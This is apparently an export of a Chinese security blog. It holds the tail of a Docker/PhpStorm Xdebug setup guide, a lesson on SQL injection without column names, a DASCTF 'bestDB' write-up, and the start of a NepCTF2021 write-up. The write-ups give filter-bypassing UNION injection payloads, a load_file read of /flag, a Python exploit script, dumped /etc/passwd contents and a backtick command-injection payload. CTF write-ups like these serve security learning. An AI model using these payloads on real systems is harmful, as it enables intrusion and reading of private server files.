&#x2F;etc&#x2F;apt&#x2F;sources.list \    &amp;&amp; apt update &amp;&amp; apt install -y vimRUN [&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-c&quot;,&quot;echo -e \&quot;xdebug.remote_enable&#x3D;On\nxdebug.remote_host&#x3D;host.docker.internal\nxdebug.remote_port&#x3D;9000\nxdebug.auto_trace&#x3D;On\nxdebug.collect_vars&#x3D;On\nxdebug.collect_return&#x3D;On\nxdebug.collect_params&#x3D;On\nxdebug.idekey&#x3D;phpstorm\nxdebug.remote_log&#x3D;&#39;&#x2F;tmp&#x2F;xdebug.log&#39;\&quot; &gt;&gt; &#x2F;usr&#x2F;local&#x2F;etc&#x2F;php&#x2F;conf.d&#x2F;myconfig.ini&quot;]RUN  docker-php-ext-install mysqli \    &amp;&amp; pecl install xdebug-2.9.0 \ # 最好也指定下版本    &amp;&amp; docker-php-ext-enable xdebugRUN apache2ctl restart</code></pre><p>在docker-compose.yml所在目录运行<code>docker-compose up -d</code></p><img src="/article/phpstormdebug/image-20210331160533708.png" class="" title="dockercompose" loading="lazy"><p>如图所示，在映射目录写个phpinfo，用不同端口访问本地可见版本不同，可以非常灵活地调试</p><img src="/article/phpstormdebug/image-20210331160730447.png" class="" title="5.6" loading="lazy"><img src="/article/phpstormdebug/image-20210331160748724.png" class="" title="7.4" loading="lazy"><p>xdebug模块也加载好了</p><hr><h2 id="配置phpstorm"><a href="#配置phpstorm" class="headerlink" title="配置phpstorm"></a>配置phpstorm</h2><p>在本地映射目录下新建项目并打开，点击右上角配置</p><img src="/article/phpstormdebug/image-20210331132235844.png" class="" title="configuration" loading="lazy"><img src="/article/phpstormdebug/image-20210331132633011.png" class="" title="con" loading="lazy"><img src="/article/phpstormdebug/image-20210331132745496.png" class="" title="image-20210331132745496" loading="lazy"><p>打开<code>设置Preferences-&gt;Build,Execution,Deployment-&gt;Deployment</code></p><img src="/article/phpstormdebug/image-20210331133638675.png" class="" title="deployment" loading="lazy"><p>打开<code>Run-&gt;Web Server Debug Validation</code></p><img src="/article/phpstormdebug/F4ECC4D5-59CE-4CA5-8304-9DC190624212.png" class="" title="validation" loading="lazy"><p>Chrome浏览器安装debug插件</p><img src="/article/phpstormdebug/image-20210331133929212.png" class="" title="debug" loading="lazy"><img src="/article/phpstormdebug/image-20210331133947378.png" class="" title="xdebug" loading="lazy"><p>然后就可以惹</p><hr><h2 id="访问测试"><a href="#访问测试" class="headerlink" title="访问测试"></a>访问测试</h2><p>一般来说都是在本地搭建环境，尽量别放有公网vps的服务器上…会被打</p><h3 id="页面测试"><a href="#页面测试" class="headerlink" title="页面测试"></a>页面测试</h3><p>映射目录写phpinfo()，访问对应端口的容器</p><img src="/article/phpstormdebug/image-20210331160730447.png" class="" title="5.6" loading="lazy"><img src="/article/phpstormdebug/image-20210331160748724.png" class="" title="7.4" loading="lazy"><h3 id="mysql测试-一键部署可用"><a href="#mysql测试-一键部署可用" class="headerlink" title="mysql测试(一键部署可用)"></a>mysql测试(一键部署可用)</h3><p>映射目录写<code>mysqltest.php</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"mysql"</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"root"</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"&lt;password>"</span><span class="token punctuation">;</span> <span class="token comment">// 自设的mysql密码</span><span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"error:"</span> <span class="token punctuation">.</span> <span class="token variable">$conn</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"success"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>访问<code>http://127.0.0.1:[port]/mysqltest.php</code></p><img src="/article/phpstormdebug/image-20210331161909008.png" class="" title="5.6mysql" loading="lazy"><img src="/article/phpstormdebug/image-20210331161926189.png" class="" title="7.4mysql" loading="lazy"><p>测试完毕</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 菜鸡教程 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL无列名注入</title>
      <link href="article/mardasctf/"/>
      <url>article/mardasctf/</url>
      
        <content type="html"><![CDATA[<p>sql注入的姿势</p><a id="more"></a><p>以DASCTF三月赛为例，记录下无列名注入。</p><h2 id="无列名查询"><a href="#无列名查询" class="headerlink" title="无列名查询"></a>无列名查询</h2><p>例如join进行无列名注入，现在有张表<code>table</code>如下</p><table><thead><tr><th>id</th><th>username</th><th>password</th><th>question</th><th>token</th></tr></thead><tbody><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>正常<strong>在数据库查询</strong>，表名需带反引号，在php端中<strong>并不需要</strong></p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329195606802.png" class="" title="table" loading="lazy"><p>假设不知道列名，通过union查询，需猜测列数，这里为5列</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329195833956.png" class="" title="union" loading="lazy"><p>如图所示，列名被替换成了数字，</p><table><thead><tr><th>1（派生表列1）</th><th>2（派生表列2）</th><th>3（派生表列3）</th><th>4（派生表列4）</th><th>5（派生表列5）</th></tr></thead><tbody><tr><td>1（原id）</td><td>2（原username）</td><td>3（原password）</td><td>4（原question）</td><td>5（原token）</td></tr><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>我们可以进一步用数字来对应列查询</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token punctuation">`</span><span class="token number">2</span><span class="token punctuation">`</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329200819627.png" class="" title="union2" loading="lazy"><p>如果反引号被过滤，同样继续用别名代替</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> c <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">as</span> b<span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span> <span class="token keyword">as</span> c<span class="token punctuation">,</span><span class="token number">5</span> <span class="token keyword">as</span> d <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">table</span><span class="token punctuation">)</span>a<span class="token punctuation">;</span></code></pre><img src="/article/mardasctf/image-20210329201418814.png" class="" title="别名" loading="lazy"><p>此时派生表如下</p><table><thead><tr><th>1（派生表列1）</th><th>b（原派生表列2）</th><th>3（派生表列3）</th><th>c（原派生表列4）</th><th>d（派生表列5）</th></tr></thead><tbody><tr><td>1（原id）</td><td>2（原username）</td><td>3（原password）</td><td>4（原question）</td><td>5（原token）</td></tr><tr><td>1</td><td>1a</td><td>1b</td><td>1c</td><td>1d</td></tr><tr><td>2</td><td>2a</td><td>2b</td><td>2c</td><td>2d</td></tr><tr><td>3</td><td>3a</td><td>3b</td><td>3c</td><td>3d</td></tr></tbody></table><p>同时查询多个列</p><pre class="language-none"><code class="language-none">select concat(b,0x2d,c) from (select 1,2 as b,3 as c,4,5 union select * from &#96;table&#96;)a;</code></pre><p><code>0x2d</code>为<code>-</code></p><img src="/article/mardasctf/image-20210329202408382.png" class="" title="concat" loading="lazy"><hr><p>以下是比赛WP</p><h3 id="DASCTF三月赛·bestDB"><a href="#DASCTF三月赛·bestDB" class="headerlink" title="DASCTF三月赛·bestDB"></a>DASCTF三月赛·bestDB</h3><blockquote><p>由于电脑崩了:(  bp和网页都没了，只能凭我写了</p></blockquote><p>进去一个查询框，题目名字有db，肯定是注入了。</p><p>注释中发现hint</p><pre class="language-html" data-language="html"><code class="language-html">&lt;!-- SELECT * FROM users WHERE id = '$query' OR username = \"$query\" --!></code></pre><p>这就建个数据库测试，经测试发现ban了空格和单引号，测试出了payload</p><p><code>-1&quot;union/**/select/**/1,2,3&quot;</code></p><img src="/article/mardasctf/image-20210329193545757.png" class="" title="union" loading="lazy"><p>回显位为1和2，改改以前的脚本，查数据库名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,database(),3"</span><span class="token comment"># databases==========>users</span></code></pre><p>查表名</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/database()),3"</span><span class="token comment"># tables==========>f1agdas,users</span></code></pre><p>无列名查询(其实直接查就好，本人复习一下之前的知识)</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,(select/**/`2`/**/from/**/(select/**/1,2/**/union/**/select/**/*/**/from/**/f1agdas/**/limit/**/1,1)a),3"</span><span class="token comment"># data==========>flag.txt</span></code></pre><hr><p>查到<code>f1agdas</code>表里有个<code>flag.txt</code>，应该是利用<code>load_file()</code>函数读取文件，查了下用户</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,user(),3"</span><span class="token comment"># user==========>'root'@'localhost'</span></code></pre><p>肯定有权限了，读了<code>index.php</code>和<code>dbConnect.php</code>，给复现的师傅参考</p><pre class="language-php" data-language="php"><code class="language-php">// index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token single-quoted-string string">'dbConnect.php'</span><span class="token punctuation">;</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token single-quoted-string string">' '</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'\''</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'flag'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'delete'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'drop'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'update'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$item</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token variable">$item</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/i"</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Forbidden!!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'query'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"SELECT * FROM users WHERE id = '<span class="token interpolation"><span class="token variable">$query</span></span>' OR username = \"<span class="token interpolation"><span class="token variable">$query</span></span>\""</span><span class="token punctuation">;</span>        <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetch_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;table border='1' width='600px' cellpadding='0' cellspacing='0'  align='center' style='margin-top: 20px; margin-left: 33%'>&lt;tr>&lt;th>ID&lt;/th>&lt;th>UserName&lt;/th>&lt;/tr>"</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$k</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;tr>&lt;td><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>&lt;/td>&lt;td><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$k</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>&lt;/td>&lt;/tr>"</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"&lt;/table>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php">// dbConnect.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$serve</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'127.0.0.1'</span><span class="token punctuation">;</span><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span><span class="token variable">$password</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'root'</span><span class="token punctuation">;</span><span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'users'</span><span class="token punctuation">;</span><span class="token variable">$mysqli</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Mysqli</span><span class="token punctuation">(</span><span class="token variable">$serve</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_error</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'connect error:'</span><span class="token punctuation">.</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">connect_errno</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$mysqli</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set_charset</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'UTF-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 设置数据库字符集</span></span></code></pre><p>读取根目录下flag，由于ban了<code>flag</code>，转十六进制即可</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">"union/**/select/**/1,hex(load_file(0x2f666c6167)),3"</span></code></pre><p><code>hex(&#39;/flag&#39;)==&#39;0x2f666c6167&#39;</code></p><p>结束了</p><p>附上小脚本，虽然没啥用</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""-*- coding: utf-8 -*-@File: exp.py@Author: gyy@Time: 3月 27, 2021"""</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://ea4d13de-db0a-41e5-b303-a843bd51a27b.machine.dasctf.com/?query="</span><span class="token keyword">def</span> <span class="token function">req</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">)</span><span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"Forbidden"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Forbidden"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;table border='1' width='600px' cellpadding='0' cellspacing='0'  align='center' style='margin-top: 20px; margin-left: 33%'>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"right"</span><span class="token keyword">def</span> <span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,database(),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># databases==========>users</span><span class="token keyword">def</span> <span class="token function">table</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,(select group_concat(table_name) from information_schema.tables where table_schema like database()),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># tables==========>f1agdas,users</span><span class="token keyword">def</span> <span class="token function">columns</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,(select `2` from (select 1,2 union select * from f1agdas limit 1,1)a),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token comment"># flag.columns==========>flag.txt</span><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"-1\"union select 1,hex(load_file(0x2f666c6167)),3\""</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">"/**/"</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> req<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token comment"># database()</span>    <span class="token comment"># table()</span>    <span class="token comment"># columns()</span>    data<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><hr><p>以下是本人的碎碎念和反思，师傅们可以跳过惹</p><p>经验不足，最后还是没能出这简单题。一方面也是平台的问题，实在太卡了:(</p><p>数据库里写的<code>flag.txt</code>，最后却在根目录<code>/flag</code>。尝试过十六进制<code>/flag</code>读取，可能是因为太卡了，没成功就没再试了，以为就是<code>flag.txt</code>。盲猜有人拿到注入题直接sqlmap开始跑（因为之前我也干过），导致服务器负载太大，或者说运维去三亚了2333</p><p>还尝试了读取一堆无用的东西，以为和 <a href="/article/Buuoj-WEB-Write-up/#Comment">[网鼎杯 2018]Comment</a> 一样</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># @@datadir</span><span class="token comment"># /var/lib/mysql/</span><span class="token comment"># @@basedir</span><span class="token comment"># /usr/</span><span class="token comment"># /etc/host</span><span class="token comment"># 127.0.0.1localhost</span><span class="token comment"># ::1localhost ip6-localhost ip6-loopback</span><span class="token comment"># fe00::0ip6-localnet</span><span class="token comment"># ff00::0ip6-mcastprefix</span><span class="token comment"># ff02::1ip6-allnodes</span><span class="token comment"># ff02::2ip6-allrouters</span><span class="token comment"># 192.168.0.1149fa7a3d75b4f</span><span class="token comment"># /etc/passwd</span><span class="token comment"># root:x:0:0:root:/root:/bin/bash</span><span class="token comment"># daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><span class="token comment"># bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><span class="token comment"># sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><span class="token comment"># sync:x:4:65534:sync:/bin:/bin/sync</span><span class="token comment"># games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><span class="token comment"># man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><span class="token comment"># lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><span class="token comment"># mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><span class="token comment"># news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><span class="token comment"># uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><span class="token comment"># proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><span class="token comment"># www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><span class="token comment"># backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><span class="token comment"># list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><span class="token comment"># irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><span class="token comment"># gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><span class="token comment"># nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><span class="token comment"># _apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><span class="token comment"># mysql:x:101:101:MySQL Server,,,:/var/lib/mysql/:/bin/false</span></code></pre><p>没有线索，盲猜读了个<code>start.sh</code></p><pre class="language-sh" data-language="sh"><code class="language-sh">#!&#x2F;bin&#x2F;bashrm -rf &#x2F;var&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock.lockrm -rf &#x2F;tmp&#x2F;mysql.sockusermod -d &#x2F;var&#x2F;lib&#x2F;mysql&#x2F; mysqlln -s &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql.sock &#x2F;tmp&#x2F;mysql.sockchown -R mysql:mysql &#x2F;var&#x2F;lib&#x2F;mysqlmysqld_safe &amp;mysql_ready() &#123;mysqladmin ping --socket&#x3D;&#x2F;run&#x2F;mysqld&#x2F;mysqld.sock --user&#x3D;root --password&#x3D;root &gt; &#x2F;dev&#x2F;null 2&gt;&amp;1&#125;while !(mysql_ready)doecho &quot;waiting for mysql ...&quot;sleep 3donemysql -e &quot;ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;root&#39;;flush privileges;&quot; -uroot -prootif [[ -f &#x2F;db.sql ]]; then    mysql -e &quot;source &#x2F;db.sql&quot; -uroot -proot    rm -f &#x2F;db.sqlfiif [[ -f &#x2F;flag.sh ]]; thensource &#x2F;flag.shfiapache2-foreground</code></pre><p>然后开始爆<code>/proc/[id]/fd/[id]</code>一去不复返了。平台弄卡也有我的一份～</p><p>甚至还读了apache配置文件等等等，实在是经验不足，还是本人太菜了2333</p><p>做个反思吧，也许哪天羞耻心爆发这段就给我删了。</p><p>写给他人明鉴，写给自己反思。</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈笔记 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF2021</title>
      <link href="article/Nepctf2021/"/>
      <url>article/Nepctf2021/</url>
      
        <content type="html"><![CDATA[<p>队伍名称：Err0r</p><a id="more"></a><p>队伍情况：</p><img src="/article/Nepctf2021/image-20210322130933265.png" class="" title="rank" loading="lazy"><p>虽然平台八太行，但是部分题目质量很高，本菜鸡爬了，虚心学习。</p><p>本Wp侧重于思路记录，大佬们轻喷…</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="little-trick"><a href="#little-trick" class="headerlink" title="little_trick"></a>little_trick</h3><h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token punctuation">.</span><span class="token operator">/</span><span class="token operator">?</span>len<span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span>nep<span class="token operator">=</span>`cat`<span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token operator">/</span><span class="token operator">?</span>len<span class="token operator">=</span><span class="token number">7</span><span class="token operator">&amp;</span>nep<span class="token operator">=</span>`<span class="token operator">*</span><span class="token operator">></span>a`<span class="token punctuation">;</span>访问<span class="token punctuation">.</span><span class="token operator">/</span>a</code></pre><h4 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h4><p>源码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$nep</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'nep'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$len</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">8</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token 